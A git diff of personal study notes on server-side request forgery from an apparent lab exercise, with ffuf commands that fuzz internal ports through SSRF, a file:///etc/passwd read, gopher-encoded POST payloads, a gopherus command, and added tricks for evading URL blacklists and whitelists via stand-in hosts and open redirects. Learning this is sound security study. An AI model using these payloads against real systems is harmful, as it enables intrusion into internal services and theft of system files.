@@ -1,4 +1,4 @@
-# Enumerating the System
+## Enumerating the System
 
 - fuzz all open ports of the internel server using the ssrf 
 
@@ -10,7 +10,7 @@
 ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
 ```
 
-# Accessing Restricted Endpoints
+## Accessing Restricted Endpoints
 
 - finding new endpoits on the `dateserver`  :
 
@@ -18,7 +18,7 @@ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: app
 ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
 ```
 
-# Local File Inclusion (LFI)
+## Local File Inclusion (LFI)
 
 - achiving `LFI` using the `file:///etc/passwd` functionality
 
@@ -38,7 +38,7 @@ Connection: keep-alive
 dateserver=file:///etc/passwd&date=2024-01-01
 ```
 
-# The gopher Protocol
+## The gopher Protocol
 
 - we are restricted to GET requests as there is no way to send a POST request with the `http://` URL scheme
 
@@ -73,8 +73,57 @@ dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%
 ```sh
  python2.7 gopherus.py --exploit smtp
 ```
+## Bypassing blacklist-based input filters
 
-# Blind SSRF
+- Using an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.
+- Register your own domain name that resolves to `127.0.0.1`. like `spoofed.burpcollaborator.net` 
+-  switching from an `http:` to `https`
+## Bypassing whitelist-based input filters
+
+- we can embed credentials in a URL before the hostname, using the `@` character. For example:
+
+```js
+https://expected-host:fakepassword@evil-host
+```
+
+- You can use the `#` character to indicate a URL fragment. For example:
+
+```js
+https://evil-host#expected-host
+```
+
+- we can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
+
+```js
+https://expected-host.evil-host
+```
+
+- we can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.
+- we  can use combinations of these techniques together.
+## Bypassing SSRF filters via open redirection
+
+- the application contains an open redirection vulnerability in which the following URL:
+
+```js
+/product/nextProduct?currentProductId=6&path=http://evil-user.net
+```
+
+- It redirect us to 
+
+```js
+http://evil-user.net
+```
+
+- we can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability
+
+```js
+POST /product/stock HTTP/1.0 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 118 
+stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
+```
+
+## Blind SSRF
 
 -  Identifying Blind SSRF
 
